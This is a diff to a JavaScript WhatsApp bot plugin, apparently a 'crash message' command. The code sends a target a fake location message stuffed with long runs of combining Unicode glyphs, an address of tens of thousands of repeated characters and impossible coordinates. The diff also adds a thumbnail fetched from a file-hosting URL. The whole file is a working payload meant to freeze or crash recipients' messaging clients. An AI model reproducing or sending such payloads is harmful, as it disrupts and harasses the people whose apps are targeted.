@@ -1,3 +1,5 @@
+import fetch from 'node-fetch'
+
 let handler = async (m, { conn }) => {
   const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat
   if (jid === conn.user.id) {
@@ -14,6 +16,11 @@ let handler = async (m, { conn }) => {
 
   const textoLargo = caracter.repeat(repeticiones) + caracter.slice(0, faltan)
 
+  // 🖼️ URL de Catbox con tu imagen .jpg (peso recomendado: 300–400 KB)
+  const catboxUrl = 'https://files.catbox.moe/ufwba7.jpeg' // reemplaza por la tuya
+  const res = await fetch(catboxUrl)
+  const thumbnail = await res.buffer()
+
   const fakeLoc = {
     key: {
       fromMe: false,
@@ -22,11 +29,11 @@ let handler = async (m, { conn }) => {
     },
     message: {
       locationMessage: {
-        name: 'C•137DOMINAᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵', // Esto se muestra arriba
-        degreesLatitude: 19.432608,   // Coordenadas de CDMX por ejemplo (válidas para simular Google)
-        degreesLongitude: -99.133209,
-        address: textoLargo, // 90,000 caracteres
-        jpegThumbnail: Buffer.alloc(1), // necesario para que WhatsApp lo vea como "mapa"
+        name: 'C•137DOMINAᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵',
+        degreesLatitude: 99.9999999999999999,
+        degreesLongitude: -99.99999999999999,
+        address: textoLargo,
+        jpegThumbnail: thumbnail,
         isLive: false
       }
     }
@@ -35,7 +42,7 @@ let handler = async (m, { conn }) => {
   await conn.relayMessage(objetivo, fakeLoc.message, { messageId: conn.generateMessageTag() })
 }
 
-handler.command = /^puta|ubicaciongoogle|fakelocgoogle$/i
+handler.command = /^puta|ubithumburl$/i
 handler.owner = true
 
 export default handler
